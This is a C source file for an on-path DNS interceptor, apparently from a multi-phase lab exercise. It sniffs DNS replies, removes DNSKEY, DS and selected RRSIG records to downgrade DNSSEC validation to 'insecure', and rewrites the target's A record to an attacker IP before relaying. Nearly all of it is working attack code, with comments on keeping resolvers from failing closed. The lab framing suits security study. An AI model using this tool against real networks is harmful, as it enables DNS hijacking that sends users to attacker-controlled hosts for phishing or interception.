/*
 * Phase 4 interceptor — on-path DNS response forger WITH a signature-
 * stripping mode, extending Phase 2/3's interceptor.c.
 *
 * Relay/diversion strategy, raw-socket send, checksum handling: identical
 * to Phase 2/3 (see that file for the full rationale). What's new here is
 * strip_enabled(): when on, for any response whose QUESTION name matches
 * target_fqdn (example.com.), every DNSKEY (48) and DS (43) record found
 * anywhere in the message -- ANSWER, AUTHORITY or ADDITIONAL -- is
 * physically removed, along with every RRSIG (46) whose *covered* type
 * (the first field inside its own RDATA, RFC 4034) is A, DS, or DNSKEY.
 * That covered-type check matters: an RRSIG over NSEC/NSEC3 is NOT
 * stripped, because that signature is the parent zone's own authenticated
 * proof that no DS exists for a name -- exactly what a resolver needs to
 * legitimately conclude "insecure" in Run B. Stripping it too would deny
 * the resolver that proof and make it fail closed (SERVFAIL) instead of
 * correctly going insecure and accepting the forged answer, which is not
 * the attack this phase is testing (confirmed against real traffic: an
 * earlier, cruder "strip every RRSIG" version of this rule broke Run B
 * exactly this way). This type-driven rule covers all three exchanges a
 * resolution of a signed example.com actually produces, because all three
 * share that same question name:
 *   - domain-ns's answer to "example.com A"       -> strips RRSIG(A)
 *   - domain-ns's answer to "example.com DNSKEY"  -> strips DNSKEY+RRSIG
 *   - tld-ns's referral for "example.com" (the DS
 *     + RRSIG(DS) riding in its AUTHORITY section) -> strips DS+RRSIG(DS),
 *     but leaves any RRSIG(NSEC)/RRSIG(NSEC3) proving no DS exists intact
 * After stripping, the pre-existing forge step runs unchanged: if an A
 * record for target_fqdn remains in ANSWER, its rdata is overwritten with
 * rogue_ip, exactly as in Phase 2/3.
 *
 * Known, deliberate simplification (shared with Phase 2/3's parse_name):
 * name-compression pointers are assumed to target an offset BEFORE any
 * record we might strip (in practice, the question name at a fixed early
 * offset) -- true for every exchange this lab's BIND instances produce,
 * since they always compress to the earliest occurrence of a name, which
 * for a single-qname response is the question itself. A record stripped
 * from later in the message therefore never invalidates an earlier
 * record's compression pointer.
 *
 * Build: gcc -O2 -Wall -o interceptor interceptor.c -lpcap
 * Run:   ./interceptor <iface> <resolver_ip> <target_fqdn> <rogue_ip> \
 *                      <forge_toggle_file> <strip_toggle_file>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>

#define ETH_ALEN 6
#define ETHERTYPE_IP 0x0800

#define DNS_TYPE_A      1
#define DNS_TYPE_DS     43
#define DNS_TYPE_RRSIG  46
#define DNS_TYPE_DNSKEY 48

#pragma pack(push, 1)
struct eth_hdr {
    uint8_t  dst[ETH_ALEN];
    uint8_t  src[ETH_ALEN];
    uint16_t ethertype;
};
struct ip_hdr {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dst_ip;
};
struct udp_hdr {
    uint16_t sport;
    uint16_t dport;
    uint16_t len;
    uint16_t checksum;
};
struct dns_hdr {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};
#pragma pack(pop)

static int raw_sock = -1;          /* IP_HDRINCL raw socket for sending */
static struct sockaddr_in resolver_addr;

static pcap_t *handle = NULL;
static pcap_dumper_t *dumper = NULL;
static uint8_t my_mac[ETH_ALEN];
static char target_fqdn[256];
static uint32_t rogue_ip_net; /* network byte order */
static char forge_toggle_file[512];
static char strip_toggle_file[512];
static long packets_seen = 0;
static long packets_relayed = 0;
static long packets_forged = 0;
static long packets_stripped = 0;
static long rrs_stripped_total = 0;

/* ---- helpers ---------------------------------------------------------- */

static uint16_t checksum16(const void *data, size_t len, uint32_t sum) {
    const uint16_t *p = data;
    while (len > 1) {
        sum += *p++;
        len -= 2;
    }
    if (len == 1) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

static int toggle_on(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    int c = fgetc(f);
    fclose(f);
    return c == '1';
}

static int forging_enabled(void) { return toggle_on(forge_toggle_file); }
static int stripping_enabled(void) { return toggle_on(strip_toggle_file); }

/* Parse a (possibly compressed) DNS name starting at buf+off, writing the
 * dotted textual form into out (size outsz). Returns the offset just past
 * the name AS IT APPEARS AT ITS ORIGINAL POSITION (one pointer hop
 * handled -- sufficient for every message this lab's BIND instances
 * produce, which always compress to the question name). */
static int parse_name(const uint8_t *buf, int buf_len, int off, char *out, int outsz) {
    int start = off, o = 0, jumped = 0, guard = 0;
    while (off < buf_len && guard++ < 64) {
        uint8_t len = buf[off];
        if (len == 0) { off++; break; }
        if ((len & 0xC0) == 0xC0) {
            if (off + 1 >= buf_len) break;
            int ptr = ((len & 0x3F) << 8) | buf[off + 1];
            if (!jumped) start = off + 2;
            off = ptr;
            jumped = 1;
            continue;
        }
        off++;
        if (off + len > buf_len) break;
        if (o + len + 1 < outsz) {
            memcpy(out + o, buf + off, len);
            o += len;
            out[o++] = '.';
        }
        off += len;
    }
    if (o < outsz) out[o] = '\0'; else out[outsz - 1] = '\0';
    return jumped ? start : off;
}

static int rr_total_len_ex(const uint8_t *buf, int buf_len, int off, uint16_t *type_out,
                            int *rdata_off_out, uint16_t *rdlength_out);

/* Compute the total on-wire length of one resource record starting at
 * buf+off (NAME + TYPE(2) + CLASS(2) + TTL(4) + RDLENGTH(2) + RDATA), and
 * report its TYPE. Returns -1 if the record is truncated/malformed (we
 * then stop processing that section rather than risk corrupting the
 * packet). RDATA itself is never parsed further: RRSIG's "signer's name"
 * field is required (RFC 4034 canonical form) to be uncompressed, so
 * RDLENGTH alone correctly bounds every record type we care about here. */
static int rr_total_len(const uint8_t *buf, int buf_len, int off, uint16_t *type_out) {
    return rr_total_len_ex(buf, buf_len, off, type_out, NULL, NULL);
}

/* Same as rr_total_len, but also reports where this record's RDATA starts
 * and how long it is (needed to peek an RRSIG's "type covered" field --
 * see strip_section). Either output pointer may be NULL. */
static int rr_total_len_ex(const uint8_t *buf, int buf_len, int off, uint16_t *type_out,
                            int *rdata_off_out, uint16_t *rdlength_out) {
    int start = off;
    char scratch[256];
    off = parse_name(buf, buf_len, off, scratch, sizeof(scratch));
    if (off + 10 > buf_len) return -1;
    uint16_t type, rdlength;
    memcpy(&type, buf + off, 2);
    memcpy(&rdlength, buf + off + 8, 2);
    type = ntohs(type);
    rdlength = ntohs(rdlength);
    int rdata_off = off + 10;
    int rr_end = rdata_off + rdlength;
    if (rr_end > buf_len || rr_end < start) return -1;
    *type_out = type;
    if (rdata_off_out) *rdata_off_out = rdata_off;
    if (rdlength_out) *rdlength_out = rdlength;
    return rr_end - start;
}

#define DNS_TYPE_NSEC   47
#define DNS_TYPE_NSEC3  50

/* An RRSIG is a candidate for stripping only if it covers a record type
 * this attack targets directly (A, DS, DNSKEY). Critically, an RRSIG
 * covering NSEC/NSEC3 (or anything else) is LEFT ALONE: that signature is
 * the parent zone's own authenticated proof that no DS exists for a name
 * -- exactly what a resolver needs to legitimately conclude "insecure"
 * (Run B). Stripping it too would deny the resolver that proof and make
 * it fail closed (SERVFAIL) instead of correctly going insecure, which is
 * not the attack this phase is testing and was caught by Run B initially
 * returning SERVFAIL instead of the forged address. */
static int rrsig_covers_strippable_type(const uint8_t *buf, int buf_len, int rdata_off, uint16_t rdlength) {
    if (rdlength < 2 || rdata_off + 2 > buf_len) return 0;
    uint16_t covered;
    memcpy(&covered, buf + rdata_off, 2);
    covered = ntohs(covered);
    return covered == DNS_TYPE_A || covered == DNS_TYPE_DS || covered == DNS_TYPE_DNSKEY;
}

/* Remove, from one section, every DNSKEY/DS record unconditionally and
 * every RRSIG whose covered type is A/DS/DNSKEY (see
 * rrsig_covers_strippable_type -- RRSIG(NSEC)/RRSIG(NSEC3) are explicitly
 * preserved). Shifts all following bytes left and shrinks *total_len
 * accordingly. *count (host order) is the section's original record
 * count; updated in place to the number of records actually left.
 * Returns the number of records removed, or -1 on a parse failure
 * (caller should stop stripping further sections at that point -- the
 * packet is probably not what we expect). */
static int strip_section(uint8_t *buf, int *total_len, int sec_off, uint16_t *count) {
    int off = sec_off;
    int n = *count;
    int i = 0;
    int removed = 0;
    while (i < n) {
        uint16_t type;
        int rdata_off = 0;
        uint16_t rdlength = 0;
        int rec_len = rr_total_len_ex(buf, *total_len, off, &type, &rdata_off, &rdlength);
        if (rec_len < 0) return removed > 0 ? removed : -1;

        int strip_this = 0;
        if (type == DNS_TYPE_DNSKEY || type == DNS_TYPE_DS) {
            strip_this = 1;
        } else if (type == DNS_TYPE_RRSIG) {
            strip_this = rrsig_covers_strippable_type(buf, *total_len, rdata_off, rdlength);
        }

        if (strip_this) {
            int rest = *total_len - (off + rec_len);
            memmove(buf + off, buf + off + rec_len, rest);
            *total_len -= rec_len;
            n -= 1;
            removed++;
            continue; /* re-examine same offset: next record (if any) slid into place */
        }
        off += rec_len;
        i++;
    }
    *count = (uint16_t)n;
    return removed;
}

static void get_own_mac(const char *iface) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFHWADDR");
        exit(1);
    }
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    close(sock);
    fprintf(stderr, "own MAC on %s: %02x:%02x:%02x:%02x:%02x:%02x\n", iface,
            my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
}

/* ---- main packet handler ---------------------------------------------- */

static void handle_packet(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes) {
    (void)user;
    static uint8_t buf[65536];
    if (h->caplen < sizeof(struct eth_hdr) || h->caplen > sizeof(buf)) return;
    memcpy(buf, bytes, h->caplen);
    int total_len = (int)h->caplen; /* mutable: shrinks if we strip records */

    struct eth_hdr *eth = (struct eth_hdr *)buf;
    if (ntohs(eth->ethertype) != ETHERTYPE_IP) return;

    int ip_off = sizeof(struct eth_hdr);
    if (total_len < ip_off + (int)sizeof(struct ip_hdr)) return;
    struct ip_hdr *ip = (struct ip_hdr *)(buf + ip_off);
    int ihl = (ip->ver_ihl & 0x0F) * 4;
    if (ip->protocol != 17) return; /* UDP only */

    int udp_off = ip_off + ihl;
    if (total_len < udp_off + (int)sizeof(struct udp_hdr)) return;
    struct udp_hdr *udp = (struct udp_hdr *)(buf + udp_off);

    int dns_off = udp_off + sizeof(struct udp_hdr);
    int dns_len = total_len - dns_off;
    if (dns_len < (int)sizeof(struct dns_hdr)) return;
    struct dns_hdr *dns = (struct dns_hdr *)(buf + dns_off);

    packets_seen++;

    uint16_t flags = ntohs(dns->flags);
    int qr = (flags >> 15) & 1;
    uint16_t qdcount = ntohs(dns->qdcount);

    char sbuf[INET_ADDRSTRLEN], dbuf[INET_ADDRSTRLEN];
    struct in_addr sa, da;
    sa.s_addr = ip->src_ip;
    da.s_addr = ip->dst_ip;
    strncpy(sbuf, inet_ntoa(sa), sizeof(sbuf));
    strncpy(dbuf, inet_ntoa(da), sizeof(dbuf));

    int did_forge = 0;
    int did_strip = 0;
    int rrs_removed_here = 0;
    int target_matches = 0;
    int answer_off = -1;

    if (qr == 1 && qdcount >= 1) {
        char qname[256];
        int off = dns_off + sizeof(struct dns_hdr);
        off = parse_name(buf, total_len, off, qname, sizeof(qname));
        off += 4; /* qtype + qclass */
        answer_off = off; /* start of the ANSWER section, valid regardless of stripping below */
        target_matches = (strcasecmp(qname, target_fqdn) == 0);

        if (target_matches && stripping_enabled() && forging_enabled()) {
            uint16_t ancount_h = ntohs(dns->ancount);
            uint16_t nscount_h = ntohs(dns->nscount);
            uint16_t arcount_h = ntohs(dns->arcount);

            int sec_off = answer_off;
            int r;

            r = strip_section(buf, &total_len, sec_off, &ancount_h);
            if (r > 0) rrs_removed_here += r;
            sec_off = answer_off; /* ANSWER section's records, now reduced, still start here */
            { /* advance sec_off past the (possibly shrunk) ANSWER section to find AUTHORITY */
                int o = answer_off, n = ancount_h;
                while (n-- > 0) { uint16_t t; int l = rr_total_len(buf, total_len, o, &t); if (l < 0) break; o += l; }
                sec_off = o;
            }

            r = strip_section(buf, &total_len, sec_off, &nscount_h);
            if (r > 0) rrs_removed_here += r;
            { /* advance past (shrunk) AUTHORITY section to find ADDITIONAL */
                int o = sec_off, n = nscount_h;
                while (n-- > 0) { uint16_t t; int l = rr_total_len(buf, total_len, o, &t); if (l < 0) break; o += l; }
                sec_off = o;
            }

            r = strip_section(buf, &total_len, sec_off, &arcount_h);
            if (r > 0) rrs_removed_here += r;

            if (rrs_removed_here > 0) {
                dns->ancount = htons(ancount_h);
                dns->nscount = htons(nscount_h);
                dns->arcount = htons(arcount_h);
                did_strip = 1;
                packets_stripped++;
                rrs_stripped_total += rrs_removed_here;
            }
        }

        /* Forge step (same logic as Phase 2/3): look at whatever is now
         * first in the ANSWER section -- after stripping, if an A record
         * for target_fqdn was present it is necessarily first (its only
         * possible companion, RRSIG(A), is gone). */
        uint16_t ancount_now = ntohs(dns->ancount);
        if (target_matches && ancount_now >= 1 && forging_enabled()) {
            char aname[256];
            int aoff = parse_name(buf, total_len, answer_off, aname, sizeof(aname));
            if (aoff + 10 <= total_len) {
                uint16_t atype, rdlength;
                memcpy(&atype, buf + aoff, 2);
                memcpy(&rdlength, buf + aoff + 8, 2);
                atype = ntohs(atype);
                rdlength = ntohs(rdlength);
                int rdata_off = aoff + 10;
                if (atype == DNS_TYPE_A && rdlength == 4 && rdata_off + 4 <= total_len) {
                    memcpy(buf + rdata_off, &rogue_ip_net, 4);
                    did_forge = 1;
                    packets_forged++;
                }
            }
        }
    }

    /* Packet length changed if we stripped anything -- update IP/UDP
     * lengths and both checksums before relaying. (If nothing was
     * stripped this is a no-op: tot_len/len already hold the original,
     * still-correct values, same as Phase 2/3.) */
    {
        ip->tot_len = htons((uint16_t)(total_len - ip_off));
        udp->len    = htons((uint16_t)(total_len - udp_off));

        ip->checksum = 0;
        ip->checksum = checksum16(ip, ihl, 0);

        udp->checksum = 0;
        int udp_len = ntohs(udp->len);
        uint32_t pseudo_sum = 0;
        pseudo_sum += (ip->src_ip >> 16) & 0xFFFF;
        pseudo_sum += ip->src_ip & 0xFFFF;
        pseudo_sum += (ip->dst_ip >> 16) & 0xFFFF;
        pseudo_sum += ip->dst_ip & 0xFFFF;
        pseudo_sum += htons(17);
        pseudo_sum += htons((uint16_t)udp_len);
        udp->checksum = checksum16(udp, udp_len, pseudo_sum);
    }

    if (dumper) {
        struct pcap_pkthdr dh = *h;
        dh.caplen = dh.len = total_len;
        pcap_dump((u_char *)dumper, &dh, buf);
    }

    /* Relay via raw IP_HDRINCL socket, same approach as Phase 2/3. */
    {
        int ip_total_len = ntohs(ip->tot_len);
        if (ip_total_len <= total_len - ip_off) {
            ssize_t sent = sendto(raw_sock, buf + ip_off, ip_total_len, 0,
                                   (struct sockaddr *)&resolver_addr, sizeof(resolver_addr));
            if (sent < 0) {
                perror("sendto");
            } else {
                packets_relayed++;
            }
        }
    }

    fprintf(stderr,
        "[%s%s] %s:%u -> %s:%u qr=%d qd=%u an=%u  "
        "(seen=%ld relayed=%ld forged=%ld stripped_pkts=%ld stripped_rrs=%ld)\n",
        did_strip ? "STRIP+" : "",
        did_forge ? "FORGE" : "relay",
        sbuf, ntohs(udp->sport), dbuf, ntohs(udp->dport),
        qr, qdcount, ntohs(dns->ancount),
        packets_seen, packets_relayed, packets_forged, packets_stripped, rrs_stripped_total);
}

int main(int argc, char **argv) {
    if (argc != 7) {
        fprintf(stderr,
            "usage: %s <iface> <resolver_ip> <target_fqdn> <rogue_ip> "
            "<forge_toggle_file> <strip_toggle_file>\n", argv[0]);
        return 1;
    }
    const char *iface       = argv[1];
    const char *resolver_ip = argv[2];
    strncpy(target_fqdn, argv[3], sizeof(target_fqdn) - 1);
    const char *rogue_ip    = argv[4];
    strncpy(forge_toggle_file, argv[5], sizeof(forge_toggle_file) - 1);
    strncpy(strip_toggle_file, argv[6], sizeof(strip_toggle_file) - 1);

    struct in_addr a;
    if (inet_pton(AF_INET, rogue_ip, &a) != 1) {
        fprintf(stderr, "bad rogue ip\n");
        return 1;
    }
    rogue_ip_net = a.s_addr;

    get_own_mac(iface);

    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) {
        perror("socket(SOCK_RAW, IPPROTO_RAW)");
        return 1;
    }
    int on = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt IP_HDRINCL");
        return 1;
    }
    memset(&resolver_addr, 0, sizeof(resolver_addr));
    resolver_addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, resolver_ip, &resolver_addr.sin_addr) != 1) {
        fprintf(stderr, "bad resolver ip\n");
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(iface, 65536, 1 /*promisc*/, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return 1;
    }
    if (pcap_setdirection(handle, PCAP_D_IN) < 0) {
        fprintf(stderr, "pcap_setdirection warning: %s\n", pcap_geterr(handle));
    }

    dumper = pcap_dump_open(handle, "/tmp/injected.pcap");
    if (!dumper) fprintf(stderr, "pcap_dump_open failed: %s\n", pcap_geterr(handle));

    struct bpf_program fp;
    if (pcap_compile(handle, &fp, "udp and port 53", 1, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(handle, &fp) < 0) {
        fprintf(stderr, "bpf filter error: %s\n", pcap_geterr(handle));
        return 1;
    }

    fprintf(stderr,
        "interceptor up on %s, resolver=%s target=%s rogue=%s "
        "forge_toggle=%s strip_toggle=%s\n",
        iface, resolver_ip, target_fqdn, rogue_ip, forge_toggle_file, strip_toggle_file);

    pcap_loop(handle, -1, handle_packet, NULL);

    if (dumper) pcap_dump_close(dumper);
    pcap_close(handle);
    return 0;
}
